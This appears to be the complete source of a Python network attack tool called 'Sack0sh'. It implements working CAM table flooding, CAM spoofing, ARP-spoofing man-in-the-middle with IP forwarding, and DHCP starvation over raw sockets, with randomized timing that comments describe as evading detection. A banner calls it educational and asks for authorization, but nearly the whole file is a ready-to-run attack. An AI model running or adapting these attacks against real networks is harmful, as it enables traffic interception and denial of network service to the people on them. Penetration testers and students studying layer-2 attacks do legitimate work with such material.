import time
import socket
import struct
import random
import argparse
import subprocess
import threading

# ====================================
# ===== Presentation of the tool =====
# ====================================


print(r"""
  _________              __   _______         .__     
 /   _____/____    ____ |  | _\   _  \   _____|  |__  
 \_____  \\__  \ _/ ___\|  |/ /  /_\  \ /  ___/  |  \ 
 /        \/ __ \\  \___|    <\  \_/   \\___ \|   Y  \
/_______  (____  /\___  >__|_ \\_____  /____  >___|  /
        \/     \/     \/     \/      \/     \/     \/ 

Sack0sh is a pentensting tool to exploit the low layer vulnerabilities as CAM flooding, ARP spoofing, and other network layer attacks.
You must using linux to run this tool and you need to have root privileges to perform the attacks.
      
[IMPORTANT] Remember that this tool is for educational purposes only and should be used responsibly and legally. 
[IMPORTANT] Always obtain proper authorization before performing any security testing or attacks on networks or systems that you do not own or have explicit permission to test.
      """)


# =============================
# ===== Parsing arguments =====
# =============================


parser = argparse.ArgumentParser(
    prog='sack0sh.py',
    description='A pentesting tool to exploit the low layer vulnerabilities as CAM flooding, ARP spoofing, and other network layer attacks.'
)
parser.add_argument('-i', '--interface', type=str, required=True, help='Network interface to use for the attack')
parser.add_argument('-m', '--mac', type=str, help='MAC address of the victim (required for CAM Spoofing)')
parser.add_argument('-t', '--target', type=str, help='Target IP')
parser.add_argument('-t2', '--target2', type=str, help='Second target IP (depending on the attack)')
parser.add_argument('-a', '--attack', type=str, required=True, choices=['CF','CS', 'ARPS', 'DHCPSTARV'], help="""Type of attack to perform:
                    - CF: CAM Flooding
                    - CS: CAM Spoofing
                    - ARPS: ARP Spoofing
                    - DHCPSTARV: DHCP Starvation
                    """)
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output for more detailed attack information')
parser.add_argument('-vv', '--very-verbose', action='store_true', help='Enable very verbose output for maximum attack details and debugging information')
args = parser.parse_args()


# ============================
# ===== Global variables =====
# ============================


DHCP_MAGIC = b'\x63\x82\x53\x63'


# ===========================================
# ===== Common function for all attacks =====
# ===========================================


# List of common OUIs for popular manufacturers to generate realistic MAC addresses during CAM flooding and spoofing attacks
common_oui = {
    "Cisco": ["00:00:0C", "00:01:C7","00:01:42"],
    "Juniper": ["00:05:85", "00:0B:CA", "00:14:BF"],
    "Fortinet": ["00:09:0F", "00:1C:57", "90:6C:AC"],
    "Dell": ["00:14:22", "00:1A:A0", "00:21:70"],
    "HP": ["00:1E:0B", "3C:D9:2B", "5C:26:0A"],
    "Lenovo": ["00:1F:16", "3C:95:09", "4C:EB:42"],
    "Apple": ["28:CF:E9", "3C:07:54", "40:A6:D9"],
    "Samsung": ["28:39:26", "38:2D:E8", "5C:0A:5B"]
}

def gen_random_mac():
    oui_list = random.choice(list(common_oui.values()))
    oui = random.choice(oui_list)
    mac = oui
    for i in range(3):
        mac += ":%02x" % random.randint(0, 255)
    return mac # ex: "00:00:0c:a3:1f:7e"


def get_own_mac():
    with open(f"/sys/class/net/{args.interface}/address", "r") as f:
        return f.read().strip()
    

def mac_to_byte(mac):
    return bytes.fromhex(mac.replace(":", ""))


def ip_to_bytes(ip):
    return socket.inet_aton(ip)


def get_dist_mac(ip, interface):
    broadcast = "ff:ff:ff:ff:ff:ff"
    own_mac = get_own_mac()
    own_ip = "0.0.0.0"
    eth = mac_to_byte(broadcast) + mac_to_byte(own_mac) + b"\x08\x06"

    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        0x0001, 
        0x0800, 
        6, 
        4,
        1,
        mac_to_byte(own_mac),
        ip_to_bytes(own_ip),
        b'\x00' * 6,
        ip_to_bytes(ip)
    )
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((interface, 0))
    s.send(eth + arp)
    s.settimeout(2)
    try:
        while True:
            frame = s.recv(60)
            if frame[12:14] == b'\x08\x06':                         # EtherType at offset 12 ?
                if frame[20:22] == b'\x00\x02':                     # OPER at offset 20 ?
                    if frame[28:32] == ip_to_bytes(ip):             # check if SPA == target IP
                        mac = frame[22:28]
                        return ':'.join(f'{b:02x}' for b in mac)
    except socket.timeout:
        return None
    finally:
        s.close()


def enable_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)


def disable_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)


def ip_checksum(data):
    if len(data) % 2 != 0:                 # Align on 2 bytes
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]    # Shift the first byte of 8 bits to the left ex: data[0]=0x45, data[1]=0x00 → (0x45 << 8) + 0x00 = 0x4500
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def build_arp(mac_src, ip_src, mac_dst, ip_dst):
    eth = (mac_to_byte(mac_dst) + mac_to_byte(mac_src) + b'\x08\x06')
    arp = struct.pack(
        "!HHBBH6s4s6s4s",           
        0x0001,                     # HTYPE : Ethernet
        0x0800,                     # PTYPE : IPv4
        6,                          # HLEN : MAC length
        4,                          # PLEN : IP length
        2,                          # OPER : ARP reply (is-at)
        mac_to_byte(mac_src),       # SHA : our MAC
        ip_to_bytes(ip_src),        # Spoofed IP
        mac_to_byte(mac_dst),       # THA : target MAC 
        ip_to_bytes(ip_dst)         # TPA : target IP
    )
    return eth + arp


def build_ethernet(mac_dst, mac_src, ethertype):
    return (
        mac_to_byte(mac_dst) +
        mac_to_byte(mac_src) +
        ethertype.to_bytes(2, byteorder='big')
    )


def build_ip_header(payload_len, ip_src="0.0.0.0", ip_dst="255.255.255.255", proto=17):
    version_ihl = (4 << 4) | 5      # IPv4, header 20 bytes
    total_len   = 20 + payload_len
    ttl         = 64
    checksum    = 0                  # calcul after
    header = struct.pack("!BBHHHBBH4s4s",
        version_ihl,
        0,                           # TOS
        total_len,
        0,                           # ID
        0,                           # Flags + Fragment
        ttl,
        proto,                       # 17 = UDP
        checksum,
        ip_to_bytes(ip_src),
        ip_to_bytes(ip_dst)
    )
    # Calcul of true checksum
    checksum = ip_checksum(header)
    return header[:10] + struct.pack("!H", checksum) + header[12:]


def build_udp_header(payload_len, port_src=68, port_dst=67):
    length = 8 + payload_len
    return struct.pack(
        "!HHHH",
        port_src,
        port_dst,
        length,
        0
    )


# ========================
# ===== CAM Flooding =====
# ========================


def cam_flooding():
    print("[+] Starting CAM Flooding attack...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((args.interface, 0))
    try:
        while True:
            time.sleep(random.uniform(0.0, 0.0005)) # Random sleep to avoid detection
            mac_src = gen_random_mac()
            if args.verbose or args.very_verbose:
                print(f"[INFO] Using interface: {args.interface}")
            if args.very_verbose:
                print(f"[DEBUG] Generated MAC adress: {mac_src}")
            mac_dst = "FF:FF:FF:FF:FF:FF" # Broadcast address to ensure the frame is prcessed by the switch
            eth_type = 0x0800 # IPv4
            payload = b"A" * 46 # Minimum Ethernet frame size
            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='big') + payload
            s.send(packet)
    except KeyboardInterrupt:
        print("\n[-] CAM Flooding attack stopped.")
    finally:
        s.close()


# ========================
# ===== CAM Spoofing =====
# ========================


def cam_spoofing():
    if not args.mac:
        print("[!] Error: --mac is required for CAM Spoofing (-a CS).")
        return
    print("[+] Starting CAM Spoofing attack...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((args.interface, 0))
    mac_src = get_own_mac() # Get the attacker MAC address from the network interface
    if args.verbose or args.very_verbose:
        print(f"[INFO] Using interface: {args.interface}")
        print(f"[INFO] Attacker MAC address: {mac_src}")
    try:
        while True:
            time.sleep(random.uniform(0.0, 0.0005)) # Random sleep to avoid detection
            mac_dst = args.mac
            eth_type = 0x0800 # IPv4
            payload = b"A" * 46 # Minimum Ethernet frame size
            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='big') + payload
            s.send(packet)
    except KeyboardInterrupt:
        print("\n[-] CAM Spoofing attack stopped.")
    finally:
        s.close()


# ========================
# ===== ARP Spoofing =====
# ========================


def restore_arp(s, mac_src, ip_src, mac_dst, ip_dst):
    packet = build_arp(mac_src, ip_src, mac_dst, ip_dst)
    for i in range (3):
        s.send(packet)
        time.sleep(0.1)


def arp_spoofing():
    if not args.target:
        print("[!] Error: --target is required for ARP Spoofing (-a ARPS).")
    if not args.target2:
        print("[!] Error: --target2 is required for ARP Spoofing (-a ARPS).")
        return
    print("[+] Starting ARP Spoofing attack ...")
    own_mac = get_own_mac()
    mac1 = get_dist_mac(args.target, args.interface)
    mac2 = get_dist_mac(args.target2, args.interface)
    if not mac1:
        print(f"[!] Could not resolve MAC for {args.target}")
        return
    if not mac2:
        print(f"[!] Could not resolve MAC for {args.target2}")
        return
    if args.verbose or args.very_verbose:
        print(f"[INFO] Interface  : {args.interface}")
        print(f"[INFO] Target 1   : {args.target} ({mac1})")
        print(f"[INFO] Target 2   : {args.target2} ({mac2})")
    if args.very_verbose:
        print(f"[DEBUG] Own MAC   : {own_mac}")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((args.interface, 0))
    enable_forwarding()
    try:
        while True:
            packet1 = build_arp(own_mac, args.target2, mac1, args.target)
            packet2 = build_arp(own_mac, args.target, mac2, args.target2)
            s.send(packet1)
            s.send(packet2)
            if args.very_verbose:
                print("[DEBUG] Packet sent")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[-] ARP Spoofing stopped, restoring ARP tables")
        restore_arp(s, mac2, args.target2, mac1, args.target)
        restore_arp(s, mac1, args.target, mac2, args.target2)
        print("[+] ARP tables restored")
    finally:
        s.close()
        disable_forwarding()


# ===========================
# ===== DHCP Starvation =====
# ===========================


# stock the offer received : { xid: {"ip": ..., "server": ..., "mac": ...} }
dhcp_offers = {}
dhcp_lock = threading.Lock()


def build_bootp(mac, xid):
    bootp = struct.pack(
        "!BBBBIHH4s4s4s4s16s64s128s",
        1,                                  # B : 1 byte  — 1 = BOOTREQUEST
        1,                                  # B : 1 byte  — 1 = Ethernet
        6,                                  # B : 1 byte  — 6 = MAC length
        0,                                  # B : 1 byte  — 0
        xid,                                # I : 4 bytes — random transaction ID
        0,                                  # H : 2 bytes — 0
        0x8000,                             # H : 2 bytes — 0x8000 = broadcast
        ip_to_bytes("0.0.0.0"),             # 4s : 4 bytes — 0.0.0.0 (client IP, unknown)
        ip_to_bytes("0.0.0.0"),             # 4s : 4 bytes — 0.0.0.0 (your IP, gived by the server)
        ip_to_bytes("0.0.0.0"),             # 4s : 4 bytes — 0.0.0.0 (server IP)
        ip_to_bytes("0.0.0.0"),             # 4s : 4 bytes — 0.0.0.0 (gateway IP)
        mac_to_byte(mac) + b'\x00' * 10,    # 16s : 16 bytes — MAC + 10 padding bytes 
        b'\x00' * 64,                       # 64s : 64 bytes — zeros
        b'\x00' * 128                       # 128s : 128 bytes — zeros
    )
    return bootp


def build_dhcp_discover(mac, xid):
    bootp = build_bootp(mac, xid)
    discover_dhcp = b'\x35\x01\x01'
    end = b'\xff'
    return bootp + DHCP_MAGIC + discover_dhcp + end


def build_dhcp_request(mac, xid, offered_ip, server_ip):
    bootp = build_bootp(mac, xid)
    request_dhcp = (
        b'\x35\x01\x03' +
        b'\x32\x04' + ip_to_bytes(offered_ip) +
        b'\x36\x04' + ip_to_bytes(server_ip)
    )
    end = b'\xff'
    return bootp + DHCP_MAGIC + request_dhcp + end


def parse_dhcp_offer(frame):
    try:
        if frame[12:14] != b'\x08\x00':                     # Check IPv4
            return None
        if frame[23] != 17:                                 # Check UDP
            return None
        if struct.unpack("!H", frame[36:38])[0] != 68:      # Check dst port = 68 
            return None
        if frame[42] != 2:                                  # Check BOOTREPLY
            return None
        # extracting informations
        xid = struct.unpack("!I", frame[46:50])[0]
        offered_ip = socket.inet_ntoa(frame[58:62])
        server_ip = socket.inet_ntoa(frame[26:30])
        # parsing options to confirm that it is an OFFER
        options = frame[42 + 240:]
        i = 0
        while i < len(options):
            opt = options[i]
            if opt == 255:
                break
            if opt == 0:
                i += 1
                continue
            length = options[i+1]
            if opt == 53 and options[i+2] == 2:             # Check message-type == OFFER
                return {"xid": xid, "offered_ip": offered_ip, "server_ip": server_ip}
            i += 2 + length
        return None
    except Exception:
        return None


def _send_dhcp_discover(stop_event, s):
    while not stop_event.is_set():
        try:
            mac = gen_random_mac()
            xid = random.randint(1, 0xFFFFFFFF)
            dhcp_payload = build_dhcp_discover(mac, xid)
            udp = build_udp_header(len(dhcp_payload))
            ip = build_ip_header(len(udp) + len(dhcp_payload))
            eth = build_ethernet("ff:ff:ff:ff:ff:ff", mac, 0x0800)
            packet = eth + ip + udp + dhcp_payload
            with dhcp_lock:
                dhcp_offers[xid] = {"mac": mac}
            s.send(packet)
            time.sleep(random.uniform(0.0, 0.001))
        except Exception as e:
            if args.very_verbose:
                print(f"[DEBUG] Send error : {e}")


def _sniff_dhcp_offers(stop_event, s):
    while not stop_event.is_set():
        try:
            frame = s.recv(4096)
            result = parse_dhcp_offer(frame)
            if result:
                if args.very_verbose:
                    print(f"[DEBUG] OFFER reçu → {result}")
                xid = result["xid"]
                offered_ip = result["offered_ip"]
                server_ip = result["server_ip"]
                with dhcp_lock:
                    if xid in dhcp_offers and "offered_ip" not in dhcp_offers[xid]:
                        dhcp_offers[xid].update({"offered_ip": offered_ip, "server_ip": server_ip})
                        mac = dhcp_offers[xid]["mac"]
                        dhcp_payload = build_dhcp_request(mac, xid, offered_ip, server_ip)
                        udp    = build_udp_header(len(dhcp_payload))
                        ip     = build_ip_header(len(udp) + len(dhcp_payload))
                        eth    = build_ethernet("ff:ff:ff:ff:ff:ff", mac, 0x0800)
                        s.send(eth + ip + udp + dhcp_payload)
        except Exception as e:
            if args.very_verbose:
                print(f"[DEBUG] Send error : {e}")


def dhcp_starvation():
    print("[+] Starting DHCP Starvation attack ...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((args.interface, 0))
    stop_event = threading.Event()
    sender_thread = threading.Thread(
        target=_send_dhcp_discover,
        args=(stop_event, s),
        daemon=True
    )
    sniffer_thread = threading.Thread(
        target=_sniff_dhcp_offers,
        args=(stop_event, s),
        daemon=True
    )
    claimed = 0
    try:
        sniffer_thread.start()
        sender_thread.start()
        while True:
            time.sleep(1)
            with dhcp_lock:
                claimed = sum(1 for v in dhcp_offers.values() if "offered_ip" in v)
                print(f"[*] IPs consumed : {claimed}", end="\r")
    except KeyboardInterrupt:
        print(f"[-] DHCP Starvation stopped, {claimed} IPs consumed.")
        stop_event.set()
    finally:
        s.close()
        sender_thread.join(timeout=2)
        sniffer_thread.join(timeout=2)



# =============================
# ===== Starting the tool =====
# =============================


if __name__ == "__main__":
    match args.attack:
        case "CF":       cam_flooding()
        case "CS":       cam_spoofing()
        case "DHCPSTARV": dhcp_starvation()
        case "ARPS":     arp_spoofing()
